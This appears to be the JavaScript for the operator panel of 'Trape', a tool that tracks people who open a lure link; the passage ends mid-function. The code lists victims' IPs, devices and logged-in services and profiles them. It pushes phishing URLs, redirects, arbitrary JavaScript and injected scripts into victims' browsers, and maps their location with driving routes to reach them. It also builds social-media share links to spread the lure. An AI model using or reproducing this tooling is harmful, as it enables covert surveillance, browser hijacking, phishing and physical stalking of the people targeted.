var user_active = null;
$(document).ready(function() {

  namespace = '/trape';
  var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);

  var Trape = {
    self: this,
    name: "Trape",
    out: "",
    key: "abcdefghijklmnopqrstuvwxyz0123456789",
    token: Math.random().toString().substring(7).substr(0,7),
    array: [0,1,2,3,4,5,6,7,8,9],
    log: function(value) {
      // simplification > console.log
      console.log(value);
    },
    deploy: function() {
      Trape.self.showDetails();
      Trape.self.shareSocial();
    }
  };

// unique detail function for attr > Trape
  Trape.self.jsToken = function() {
    var randomToken = function() {
      // helping: http://stackoverflow.com/questions/8532406/create-a-random-token-in-javascript-based-on-user-details
      return Trape.token;
    };
    var generateToken = function() {
      return randomToken();
    }; 
    var random = function(values) {
      return values[Math.floor((Math.random()*values.length))];
    };
    var supportRand = function() {
      for(var val = 0; val < 5; val++)
        Trape.out += Trape.key.charAt(Math.floor(Math.random()*Trape.key.length));
      return Trape.out; 
    }
    var prefixRand = function() {
      return random(Trape.array)  
    };

    var token = Trape.runToken = prefixRand() + supportRand() + generateToken();

    Trape.log("Token" + "-" + Trape.name + ":" + " " + token);

    // running token
    return token; 
  }

  // Running jsToken
  var token = Trape.self.jsToken();

  if (localStorage.trape == null) {
        window.location.replace('/');
    } else {
        var id = { 
            id : localStorage.trape
        };

        $.ajax({
            url: '/login',
            data: id,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status != 'OK'){
                    //Delete localStorage Variable
                    delete localStorage.trape;
                    //Redirect to the panel
                    window.location.replace('/');
                } else {

                    $.ajax({
                      url: '/get_title',
                      dataType: "json",
                      type: 'POST',
                      complete: function(data) {
                        $('#lblTrape_DomainTitle').text(data.responseJSON.title);
                        $('#lnkTrape_ShareTwitter').attr('href','https://twitter.com/intent/tweet?url=' + 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path +'&text=' + data.responseJSON.title + '&hashtags=FirstYourSecurity&via=boxug');
                        $('#lnkTrape_ShareFacebook').attr('href','https://www.facebook.com/sharer.php?u=' + 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
                      }   
                    });

                    $('.TrapeControl-Header--menu---btnLogout').attr('href', '/' + response.logout);
                    window.rm_p = response.rm_path;
                    $('#lnkTrapeControl_DomainClone').text(response.url_to_clone);
                    $('#lnkTrapeControl_DomainClone').attr('href', response.victim_path);
                    $('#lblTrapeControl_StartDate').text(response.date_start);

                    $('#lnkTrapeControl_url').text('http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
                    $('#lnkTrapeControl_url').attr('href', 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);

                    socket.emit('join', {room: id.id});
               }
            },
            error: function(error) {
                console.log(error);
            }
        });


        dataSync();
    }

    Trape.self.showDetails = function() {
        // Generate unique box Modal (Detail) safe touch :)
        $(".TrapeControl-ViewDetails").attr("id", "show" + "-" + token);
    };

    Trape.self.shareSocial = function() {
        var menuToggle = $('[data-action="toggle"]');
        var menu = $('.TrapeControl-shareBox');

        menuToggle.click(function() {
            menu.toggleClass("active");
        });

        $(".TrapeControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare").click(function(event) {
            event.preventDefault();
            event.stopPropagation();
            $(".TrapeControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare").toggleClass("is-active--up");
        });
    }

    $(document).delegate('[button-trape-detail="show"]', 'click', function(event) {
      event.preventDefault();
        var idVictim = $(this).attr("data-vid");
        window.idVictim = idVictim;
        window.user_behavior = $(this).parent('div').parent('div').find('.TrapeControl-History--Logs---centerData----behavior').text();
        $('#lblTrapeControl-PreviewProfileWhoIsItBox--info---TypeVictim').text(behaviorText[Math.round(Math.random() * (behaviorText.length - 1))]);
        User.getDetails(idVictim,  function(){
          User.loadMap();
        });
      });

    $(document).delegate(".TrapeControl-UpgradeModal--buttonClose", 'click', function(event) {
        event.preventDefault();
        $(".TrapeControl-UpgradeModal").removeClass("active");
    });
    
    $(document).delegate(".TrapeControl-Preview--buttonClose", 'click', function(event) {
        event.preventDefault();
        $(".TrapeControl-ViewDetails").removeClass("active");
        window.tracking_victim = false;
    });

    // Tabs logs/requests
    $(document).delegate(".TrapeControl-History--Tabs---button", 'click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-History--Logs");
        $('.TrapeControl-History--Tabs---button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

    // Tabs info/attacks
    $(".TrapeControl-Preview--Tabs---button").on('click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-BoxTab");
        $('.TrapeControl-Preview--Tabs---button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

// Tabs whoisit/sessions
    $(".TrapeControl-Preview--box---Sidebar----Tabs-----button").on('click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-WhoSe");
        $('.TrapeControl-Preview--box---Sidebar----Tabs-----button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

    // Tabs subHooks
    $(".TrapeControl-BoxTab--options---Tabs----button").on('click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-Preview--SubTabsShow");
        $('.TrapeControl-BoxTab--options---Tabs----button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });


   // Tabs networkStatus
    $(".TrapeControl-BoxTab--options---subTabs----button").on('click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-Preview--SubTabsNH");
        $('.TrapeControl-BoxTab--options---subTabs----button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });
    // run functions
    Trape.deploy();

    socket.on('my_response', function(msg) {
        switch (msg.data){
            case 'update-data':
                dataSync();
                break;
            default:
                return false;
        }
    });

    $(document).delegate('.TrapeControl-Preview--box---Sidebar----NetworksStatus.online', 'click', function(event) {
        var network = $(this).parent('div').attr("class").replace('TrapeControl-Preview--box---Sidebar----NetworksDefine ', '');
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'network', 'message' : network}});
        });
    });

    $('#btnTrapeControl-BoxTab-Phishing').on('click', function(event) {
        event.preventDefault();
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'url', 'message' : $('#txtTrapeControl-BoxTab-Phishing').val()}}); 
        });
    });

    $('#btnTrapeControl-BoxTab-Redirect').on('click', function(event) {
        event.preventDefault();
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'redirect', 'message' : $('#txtTrapeControl-BoxTab-Redirect').val()}}); 
        });
    });

    $('#btnTrapeControl-BoxTab-Alert').on('click', function(event) {
        event.preventDefault();
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'alert', 'message' : $('#txtTrapeControl-BoxTab-Alert').val()}}); 
        });
    });

    $('#btnTrapeControl-BoxTab-Execute').on('click', function(event) {
        event.preventDefault();
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'execute', 'message' : $('#txtTrapeControl-BoxTab-Execute').val()}}); 
        });
    });

    $('#btnTrapeControl_RunCode').on('click', function(event){
        event.preventDefault();
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'jscode', 'message' : $('#txtTrapeControl_RunCode').val()}}); 
        });
    });

    $('#btnTrapeControl_InjectCode').on('click', function(event){
        event.preventDefault();
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'jsscript', 'message' : $('#txtTrapeControl_InjectCode').val()}}); 
        });
    });

    var voicesType = [
        'UK English Female',
        'Spanish Latin American Female',
        'UK English Male',
        'Latin Male'
    ];

    $(document).delegate('.TrapeControl-BoxTab--Form---buttonsVoice----btn', 'click', function(event){
        event.preventDefault();
        var vt = voicesType[$(this).attr('data-vt')];
        checkUserStatus(function(){
          socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'talk', 'message' : $('#txtTrapeControl_BoxTab_Speech').val(), 'voice' : vt}}); 
        });
    });

    function checkUserStatus(callback){
      if ($('#lblTrapeControl_NavigationMode_Status').text() == 'Online'){
        callback();
        $('.TrapeControl-Preview--NotificationAlert---define').hide();
        $('.TrapeControl-Preview--NotificationAlert').fadeIn(300).delay(2600).fadeOut(600);
        $('.TrapeControl-Preview--NotificationAlert---success').fadeIn(300).delay(2600).fadeOut(600);
      } else {
        $('.TrapeControl-Preview--NotificationAlert---define').hide();
        $('.TrapeControl-Preview--NotificationAlert').fadeIn(300).delay(2600).fadeOut(600);
        $('.TrapeControl-Preview--NotificationAlert---offline').fadeIn(300).delay(2600).fadeOut(600);
      }
    }

    $('.TrapeControl-BoxTab--Form, .TrapeControl-BoxTab--FormRight').on('submit', function(event) {
        event.preventDefault();
        $(this).find('button').trigger('click');
    });

    $(document).delegate('.TrapeControl-History--Logs---log----Delete', 'click', function(event) {
        $(this).hide();
        $(this).parent('div').find('a').hide();        
        $(this).parent('div').find('div').hide();
        var tds = '';
        tds += '<div class="TrapeControl-History--Logs---log----ConfirmDeleteBox">';
            tds +='<p><span class="TrapeControl-History--Logs---log----ConfirmDeleteBox-----message"><i class="icon-trash"></i> Are you sure that you want to delete this row?</span>';
            tds +='<div class="TrapeControl-History--Logs---log----ConfirmDeleteBox-----Buttons">'
            tds +='<a href="#" class="TrapeControl-History--Logs---log----ConfirmDeleteBox-----ButtonsYes">Yes</a>';
            tds +='<a href="#" class="TrapeControl-History--Logs---log----ConfirmDeleteBox-----ButtonsNo">No, cancel</a>';
            tds +='</div>';
            tds +='</p>';
        tds += '</div>'
        $(this).parent('div').append(tds);
    });

    $(document).delegate('.TrapeControl-History--Logs---log----ConfirmDeleteBox-----ButtonsNo', 'click', function(event) {
        $(this).parent('div').parent('div').parent('div').find('a').show();        
        $(this).parent('div').parent('div').parent('div').find('div').show();
        $(this).parent('div').parent('div').remove();
    });

    $(document).delegate('.TrapeControl-History--Logs---log----ConfirmDeleteBox-----ButtonsYes', 'click', function(event) {
        var code = $(this).parent('div').parent('div').parent('div').find('.TrapeControl-History--Logs---zonePreview----code').text();
        var obj = this;

        $.ajax({
            url: '/' + window.rm_p,
            data: {vId : code},
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status = 'OK'){
                    $(obj).parent('div').parent('div').parent('div').parent('div').remove();
                }
            },
            error: function(error) {
            }
        });
        
    });

    $('.TrapeControl-Preview--box---Mapbox----putNameLog').on('submit', function(event){
      event.preventDefault();
      $.ajax({
            url: '/pn',
            data: {vId : user_active, 'n' : $('.TrapeControl-Preview--box---Mapbox----putNameLog-----input').val()},
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status = 'OK'){
                    
                }
            },
            error: function(error) {
            }
        });
    });

    $('#txtTrapeControl_SelectPlayAttack').on('change', function(event){
        if ($(this).val() != ''){
            socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'network', 'message' : $(this).val()}});
        }
    });

});

/* Here is defined, a behavioral supposition of a user or victim */
function profiling(value) {
    var behavior = 'Unknown';
    if (value != undefined) {
        behavior = 'User';
        if (value.indexOf('Facebook') >= 0) {   
            behavior = 'Common';
        }
        if (value.indexOf('Instagram') >= 0) {   
            behavior = 'Common';
        }
        if (value.indexOf('Messenger') >= 0) {   
            behavior = 'Common';
        }
        if (value.indexOf('Airbnb') >= 0) {   
            behavior = 'Traveller';
        }
        if (value.indexOf('Udemy') >= 0) {   
            behavior = 'Student';
        }
        if (value.indexOf('Khanacademy') >= 0) {   
            behavior = 'Student';
        }
        if (value.indexOf('Square') >= 0) {   
            behavior = 'Merchant';
        }
        if (value.indexOf('Meetup') >= 0) {   
            behavior = 'Meeting manager';
        }
        if (value.indexOf('Patreon') >= 0) {   
            behavior = 'Good Samaritan';
        }
        if (value.indexOf('Patreon') >= 0 || value.indexOf('PayPal') >= 0) {   
            behavior = 'Good Samaritan';
        }
        if (value.indexOf('Disqus') >= 0) {   
            behavior = 'Publisher';
        }
        if (value.indexOf('Twitch') >= 0) {   
            behavior = 'Gamer';
        }
        if (value.indexOf('Udemy') >= 0 || value.indexOf('Khanacademy') >= 0) {   
            behavior = 'Tech student';
        }
        if (value.indexOf('Square') >= 0 || value.indexOf('PayPal') >= 0) {   
            behavior = 'Merchant';
        }
        if (value.indexOf('Spotify') >= 0 || value.indexOf('Youtube') >= 0) {   
            behavior = 'Musician';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0)   {   
            behavior = 'Common';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0 && value.indexOf('Messenger') >= 0 )   {   
            behavior = 'Very social';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0 && value.indexOf('Twitter') >= 0) {   
            behavior = 'Marketer';  
        }
        if (value.indexOf('Medium') >= 0 || value.indexOf('Reddit') >= 0) {   
            behavior = 'Geek';  
        }
        if (value.indexOf('Snapchat') >= 0 || value.indexOf('Instagram') >= 0) {   
            behavior = 'Photographer';  
        }
        if (value.indexOf('Bitbucket') >= 0 || value.indexOf('Github') >= 0) {   
            behavior = 'Developer';  
        }
        if (value.indexOf('Airbnb') >= 0 || value.indexOf('Foursquare') >= 0) {   
            behavior = 'Traveller';  
        }
        if (value.indexOf('Slack') >= 0 || value.indexOf('Hackernews') >= 0) {   
            behavior = 'Entrepreneur';  
        }
        if (value.indexOf('Slack') >= 0 && value.indexOf('Hackernews') >= 0 && value.indexOf('Reddit') >= 0) {    
            behavior = 'Entrepreneur';  
        }
        if (value.indexOf('Bitbucket') >= 0 && value.indexOf('Github') >= 0 && value.indexOf('PayPal') >= 0 && value.indexOf('Reddit') >= 0) {   
            behavior = 'Hacker';  
        }
        if (value.indexOf('Medium') >= 0 && value.indexOf('Bitbucket') >= 0 && value.indexOf('Github') >= 0 && value.indexOf('PayPal') >= 0 && value.indexOf('Reddit') >= 0 && value.indexOf('Hackernews') >= 0 && value.indexOf('Airbnb') >= 0 && value.indexOf('Twitter') >= 0 && value.indexOf('Spotify') >= 0 && value.indexOf('Youtube') >= 0) {   
            behavior = 'Tech-lover';  
        }

    }

    return behavior;
} 

function dataSync() {
    $.ajax({
            url: '/get_data',
            data: null,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                var htmlData = '';
                var locations = [];
                var chkLocations = 0;
                var tmpId = '';
                var networks = [];
                $.each(response.n, function(index, val) {
                    if (tmpId != val[0]) {
                        networks[val[0]] = [];
                        tmpId = val[0];
                    }

                    networks[val[0]].push(val[3]);
                });

                $('#lnkTrapeControl_InjectCode').attr('href', response.ic);
                $('#lnkTrapeControl_InjectCode').text(response.ic);

                setSocialImpact(response.d.length);
                if (response.d.length > 0) {
                    $.each(response.d, function(index, val) {
                        var userType = profiling(networks[val[0]]);
                        chkLocations = locations.indexOf(val[15]);
                        if (chkLocations < 0) {
                            locations.push(val[15]);
                        }

                        if ($(".TrapeControl-ViewDetails").hasClass("active")){
                          if (val[0] == user_active){
                            User.getDetails();
                          }
                        }

                        htmlData += '<div class="TrapeControl-History--Logs---log">';

                          if (val[6] == 'android' || val[6] == 'iphone'){
                            htmlData += '<span class="TrapeControl-History--Logs---logDevice----mobile"></span>';
                          } else {
                            htmlData += '<span class="TrapeControl-History--Logs---logDevice----desktop"></span>';
                          }
                          htmlData += '<div class="TrapeControl-History--Logs---logData">';
                          if (val[30] == ''){
                            htmlData += '';
                          } else{
                            htmlData += '<span class="TrapeControl-History--Logs---logData----InitialNameLog">' + val[30].substring(0, 1).toUpperCase() + '</span>';
                          }
                            htmlData += '<a class="TrapeControl-History--Logs---logData----victimIP" target="_blank" href="http://' + val[14] +  '">' + val[14] +  '<span class="TrapeControl-History--Logs---logData----lineVertical"></span>' + '<small class="c-' + val[9] + '">' + val[9] + '</small>' + '<span class="TrapeControl-History--Logs---logData----requests"><span class="TrapeControl-History--Logs---logData----iconRequests"></span>' + val[25] + '</span><span class="TrapeControl-History--Logs---logData----lineVertical"></span>';
                                if (networks[val[0]] != undefined){
                                    htmlData += '<span class="TrapeControl-History--Logs---logData----services"><span class="TrapeControl-History--Logs---logData----iconServices"></span>' + networks[val[0]].length + '</span>';
                                }  else{
                                    htmlData += '<span class="TrapeControl-History--Logs---logData----services"><span class="TrapeControl-History--Logs---logData----iconServices"></span>0</span>';
                                }
                            htmlData += '</a>';
                            htmlData += '<span class="TrapeControl-History--Logs---logData----countryTime"><strong>' + val[13] + '</strong> on ' + val[2] + '</span>';
                          htmlData += '</div>';
                          htmlData += '<div class="TrapeControl-History--Logs---zonePreview">';
                            htmlData += '<div class="TrapeControl-History--Logs---zonePreview----code">' + val[0].substring(0, 5) + '</div> ';
                            htmlData += '<a class="TrapeControl-History--Logs---zonePreview----button" href="#" data-vid="' + val[0] + '" button-trape-detail="show"><span class="icon-database"></span> details <span class="icon-angle-right"></span></a>' + '<div class="TrapeControl-History--Logs---log----Delete"><i class="icon-times"></i></div>';
                          htmlData += '</div>';
                          htmlData += '<div class="TrapeControl-History--Logs---centerData">';
                            htmlData += '<div class="TrapeControl-History--Logs---centerData----osBrowser">';
                              htmlData += '<p class="TrapeControl-History--Logs---centerData----osBrowser-----browser"><strong><span class="logs-iconDEvice icon-' + val[5].toLowerCase() + '"></span></strong> ' + val[5].charAt(0).toUpperCase() + val[5].slice(1) + ' </p>';
                              htmlData += '<p class="TrapeControl-History--Logs---centerData----osBrowser-----os"><strong><span class="logs-iconDEvice icon-' + val[6] + '"></span></strong> ' + val[6] + '</p>';
                            htmlData += '</div>';
                            htmlData += '<div class="TrapeControl-History--Logs---RefererBadge"><span class="TrapeControl-History--Logs---RefererBadge----ref">ref</span><span class="TrapeControl-History--Logs---RefererBadge----domain">' + val[28] + '</span></div>'
                            htmlData += '<span class="TrapeControl-History--Logs---centerData----behavior">' + userType + '</span>';
                          htmlData += '</div>';
                        htmlData += '</div>';
                    });

                } else {
                    htmlData += '<div class="TrapeControl-HistoryRequests--NotData">';
                      htmlData += 'There are no users available, he shares the lure.';
                    htmlData += '</div>';
                }

                $('#listLogs div').remove();
                $('#listLogs').prepend(htmlData);

                $("#usersTotal").text(response.d.length);
                $('#locationsTotal').text(locations.length);

                $('#clicksTotal').text(response.c);
                $('#sessionsTotal').text(response.s);
                $('#onlineUsers').text(response.o);
            },
            error: function(error) {
                console.log(error);
                setTimeout(function() {
                    dataSync(); 
                }, 3000);
            }
        });

        $.ajax({
            url: '/get_requests',
            data: null,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                var htmlData = "";
                var requests = 0;

                var tmpId = "";
                var tmpTarget = [];

                $.each(response.d, function(index, val) {
                    if (tmpId != val[0]) {
                        tmpId = val[0];
                        requests++;
                        if (htmlData != '') {
                            htmlData += '</ul></div></div></div><!-- -->';
                        }

                        tmpTarget = val[2].split('/');
                        tmpTarget = tmpTarget[0] + '//' + tmpTarget[2];

                        htmlData += '<!-- -->';
                        htmlData += '<div class="TrapeControl-Requests">';
                          htmlData += '<div class="TrapeControl-Requests--HeaderData">';
                            htmlData += '<div class="TrapeControl-Requests--HeaderData---define">';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---idRequest">' + val[1] + '</div>';
                              htmlData += '<!--<div class="TrapeControl-Requests--HeaderData---define----value">Endpoint: <strong>localhost:8080</strong></div> -->';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---define----value">IP user: <strong>' + val[7] +  '</strong></div>';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---define----value">Target: <strong>' + tmpTarget + '</strong></div>';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---define----value">Date: <strong>' + val[6] + '</strong></div>';
                            htmlData += '</div>';
                          htmlData += '</div>';
                          htmlData += '<div class="TrapeControl-Requests--body">';
                            htmlData += '<div class="TrapeControl-Requests--body---Data">';
                              htmlData += '<ul>';
                    }

                            htmlData += '<div class="TrapeControl-Requests--body---Data----view"><strong>' + (val[3] || val[4]) + ':</strong> ' + val[5] + '</div>';
                });
                if (htmlData != '') {
                    htmlData += '</ul></div></div></div><!-- -->';
                } else{
                    htmlData += '<div class="TrapeControl-HistoryRequests--NotData">';
                      htmlData += 'No user requests yet';
                    htmlData += '</div>';
                }

                $('#listRequests div').remove();
                $('#listRequests').append(htmlData);

                $('#requestsTotal').text(requests);
                setTimeout(function(){ dataSync(); }, 5000);
            },
            error: function(error) {
                console.log(error);
                setTimeout(function(){ dataSync(); }, 3000);
            }
        });
}

var t_map;

var initMap = function() {
    try {
        window.t_map = new google.maps.Map(document.getElementById('cntTrapeControlPreview_Map'), {
          zoom: 4,
          center: {lat: 4.6567033, lng: -74.0593867}
        });
    }
    catch(err) {
        
    }

    window.markers = [];
  }

var loadMap = function(locations){
    var bounds = new google.maps.LatLngBounds();
    var cIcon = 'blue';

    for (var i = 0; i < window.markers.length; i++) {
      window.markers[i].setMap(null);
    }

    window.markers = [];

    function put_Current_Position_onMap(lat, lon){
            marker = new google.maps.Marker({
            position: new google.maps.LatLng(parseFloat(lat), parseFloat(lon)),
            map: window.t_map,
            icon: {
              path: google.maps.SymbolPath.CIRCLE,
              scale: 5,
              strokeColor: '#000',
              strokeWeight: 5, 
              fillColor: '#fff',
              fillOpacity:1
            }
        });

        bounds.extend(marker.position);

        window.markers.push(marker);

        var idPos = window.markers.length - 1;

        $.each(window.markers, function(index, val) {
            var p = val.position;

             if (index != idPos){
                var d = getRange(p.lat(), p.lng(), lat, lon);
                val.setTitle(String(d) + ' Kms');
             } else{
                val.setTitle('Current position');
             }
        });
    }

    for (i = 0; i < locations.length; i++) {
        marker = new google.maps.Marker({
            position: new google.maps.LatLng(locations[i][1], locations[i][2]),
            map: window.t_map,
            icon: {
              scaledSize: new google.maps.Size(35, 35),
              url: 'static/img/point-' + cIcon + '.svg'
            }
        });
        
        cIcon = 'red';

        bounds.extend(marker.position);

        window.markers.push(marker);
    }

    if (navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(objPosition){
            var lon = objPosition.coords.longitude;
            var lat = objPosition.coords.latitude;
            put_Current_Position_onMap(lat, lon);
            geolocation_callback(lat, lon);

            window.tracking_victim = true;

            f_tracking_victim();
        }, function(objPositionError) {
           $.ajax({
                url: "https://www.googleapis.com/geolocation/v1/geolocate?key=" + window.gMapsApiKey,
                data: {},
                dataType: "json",
                type: "POST",
                success: function(response, status) {
                    if (status == 'success'){
                        var lat = locations[1][1];
                        var lat = locations[1][2];
                        put_Current_Position_onMap(lat, lon);
                        geolocation_callback(response.location.lat, response.location.lng);
                    } else{
                        alert("Unable to access your position information.");
                    }
                },
                error: function(error) {
                    alert("Access to the user's position was not allowed.");
                }
            });
            
        }, {
            maximumAge: 75000,
            timeout: 15000
        });
    }

    window.t_map.fitBounds(bounds);
}

var fillTab = function(data_action, data){
    if (data != null){
        
        cnt = $('.TrapeControl-BoxTab[data-action="' + data_action + '"]').find('.TrapeControl-Preview--dataShow').find('ul');
        $(cnt).find('div').remove();
        
        var idx = 0;
        var tds = '';
        $.each(data, function(index, val) {
            if (val != null){
                if (typeof(val) == 'object'){
                    $.each(val, function(index2, val2) {
                        if (typeof(val2) == 'object'){
                            $.each(val2, function(index3, val3) {
                                 if (typeof(val3) == 'object'){
                                    $.each(val3, function(index4, val4) {
                                        if (typeof(val4) == 'object'){
                                            $.each(val4, function(index5, val5) {
                                                if (typeof(val5) == 'object'){
                                                    $.each(val5, function(index6, val6) {
                                                        if (typeof(val6) == 'object'){

                                                        } else{
                                                            fillTap_PutCell(index6, val6);
                                                        }
                                                    });
                                                } else {
                                                    fillTap_PutCell(index5, val5);
                                                }
                                            });
                                        } else{
                                            fillTap_PutCell(index4, val4);     
                                        }
                                    });
                                 } else{
                                    fillTap_PutCell(index3, val3);
                                 }
                            });
                        } else{
                            fillTap_PutCell(index2, val2);
                        }
                    });
                } else{
                    fillTap_PutCell(index, val);
                }
            }
            
        });

        if (idx%2 > 0){
            tds += '<div class="TrapeControl-Preview--dataShow---define">';
                tds += '<strong></strong> ';
                tds += '<span></span>';
            tds += '</div>';
            $(cnt[Math.ceil(idx%2)]).append(tds);
        } 

        function fillTap_PutCell(ftpc_index, ftpc_val){
            tds += '<div class="TrapeControl-Preview--dataShow---define">';
                tds += '<strong>' + String(ftpc_index).replace(/_/gi, ' ') + ': </strong> ';
                tds += '<span>' + ftpc_val + '</span>';
            tds += '</div>';
            $(cnt[Math.ceil(idx%2)]).append(tds);
            tds = '';
            idx++;
        }  
    }
}

function getRange(lat1,lon1,lat2,lon2) {
    rad = function(x) {return x*Math.PI/180;}
    var R = 6378.137; 
    var dLat = rad( lat2 - lat1 );
    var dLong = rad( lon2 - lon1 );
    var a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(rad(lat1)) * Math.cos(rad(lat2)) * Math.sin(dLong/2) * Math.sin(dLong/2);
    var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    var d = R * c;
    return d.toFixed(3);
 }

 var behaviorText = [
    'Trape has defined the profile as a ',
    'Trape has defined behavior as ',
    'Trape has identified him as a possible '
 ];

function f_tracking_victim(){
    if (navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(objPosition){
            var latlng = new google.maps.LatLng(objPosition.coords.latitude, objPosition.coords.longitude);
            window.markers[2].setPosition(latlng);

            var objLocation = window.markers[1].getPosition();
        
            var vOrigin = objPosition.coords.latitude + ',' + objPosition.coords.longitude;
            var vDestination = objLocation.lat() + ',' + objLocation.lng();

            window.directionsService.route({
                  origin: vOrigin,
                  destination: vDestination,
                  travelMode: 'DRIVING'
                }, function(response, status) {
                if (status === 'OK') {
                    var vLegs = response.routes[0].legs[0];
                    if (vLegs != undefined){
                        if (vLegs.distance != undefined){
                            if (vLegs.distance.value != undefined){
                                $('#txtTrapeControl_Distance').text(vLegs.distance.text);
                                if (vLegs.distance.value < 15){
                                    $('#txtTrapeControl_Distance').text('you have arrived');
                                    $('#txtTrapeControl_Distance').removeClass('TrapeControl-Preview--box---Distance----NowDistance');
                                    $('#txtTrapeControl_Distance').addClass('TrapeControl-Preview--box---Distance----NowTarget');
                                } else{
                                    $('#txtTrapeControl_Distance').removeClass('TrapeControl-Preview--box---Distance----NowTarget');
                                    $('#txtTrapeControl_Distance').addClass('TrapeControl-Preview--box---Distance----NowDistance');
                                    
                                }
                            }
                        }
                    }
                } 
            });
            if (window.tracking_victim){
                setTimeout(f_tracking_victim, 30000);
            }
        }, function(objPositionError) {
            if (window.tracking_victim){
                setTimeout(f_tracking_victim, 10000);
            }
            
        }, {
            maximumAge: 75000,
            timeout: 15000
        });
    }
}

function geolocation_callback(lat, lon){

    if (window.directionsDisplay != undefined){
        window.directionsDisplay.setMap(null);
    }

    window.directionsService = new google.maps.DirectionsService;
    window.directionsDisplay = new google.maps.DirectionsRenderer;

    window.directionsDisplay.setMap(window.t_map);
    directionsDisplay.setOptions( { suppressMarkers: true } );

    
    function calculateAndDisplayRoute() {
        var objLocation = window.markers[1].getPosition();
        
        var vOrigin = lat + ',' + lon;
        var vDestination = objLocation.lat() + ',' + objLocation.lng();

        window.directionsService.route({
          origin: vOrigin,
          destination: vDestination,
          travelMode: 'DRIVING'
        }, function(response, status) {
          if (status === 'OK') {
            var vLegs = response.routes[0].legs[0];
            $('.TrapeControl-Preview--box---Distance----subText').text(vLegs.distance.text);
            $('.TrapeControl-Preview--box---Distance----subTextTime').text(vLegs.duration.text);
            $('#lblTrapeContol_Address').text(vLegs.end_address)
            directionsDisplay.setDirections(response);
          } else {
            window.alert('Directions request failed due to ' + status);
          }
        });
    }
    calculateAndDisplayRoute();
}

var timeDisconect = function (v_date){
    v_date = new Date(v_date.replace(' - ', 'T').replace(" ", "T") + "Z");
    var currentDate = new Date();
    
    var v_time = v_date.getTime();
    var currentTime = currentDate.getTime();

    var diference = currentTime-v_time;

    diference = parseInt(((diference/1000)/60)-300);

    var ans = "";
    if (diference < 2) {
      ans = "One moment ago";
    } else {
      if (diference < 60) {
        ans = diference + " minutes ago";
      } else {
        if (diference < 120) {
          ans = "1 hour ago";
        } else {
          if (diference < 1440) {
            ans = parseInt(diference/60) + " hours ago";
          } else {
            if (diference < 43200) {
              ans = parseInt(diference/60/24) + " days ago";
            } else {
              ans = parseInt(diference/60/24/30) + " months ago";
            }
          }
        }
      }
    }

    return ans;
}

var setSocialImpact = function(total_users){
  if (total_users > 0){
    $.ajax({
      url: '/get_socialimpact',
      data: null,
      dataType: "json",
      type: 'POST',
      success: function(response) {
        if (response.d.length > 0){
          var tds = '';
          var total_interactions = 0;
          $.each(response.d, function(index, val) {
             total_interactions += val[1];
          });
